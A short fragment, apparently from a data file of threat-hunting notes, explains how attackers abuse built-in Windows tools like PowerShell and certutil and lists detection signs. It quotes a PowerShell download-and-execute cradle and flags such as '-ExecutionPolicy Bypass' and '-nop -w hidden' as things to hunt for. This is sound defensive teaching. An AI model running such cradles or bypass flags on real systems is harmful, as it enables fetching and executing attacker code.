        "Attackers favor tools already on the system and signed by Microsoft, so there is no malware file to catch (the same idea covers LOLScripts and LOLDrivers). Entire intrusions have run on nothing but PowerShell, certutil, WMI and PsExec.",
        "**PowerShell**: downloads (`Invoke-WebRequest`, `Net.WebClient`), in-memory execution and AD enumeration. Hunt for `-EncodedCommand`/`-enc` with Base64, `-ExecutionPolicy Bypass`, `-nop -w hidden`, download cradles and Office or browser parents. Decode the Base64 in CyberChef to reveal lines such as `IEX (New-Object Net.WebClient).DownloadString('http://...')`; Event ID 4104 script block logging records the deobfuscated script.",
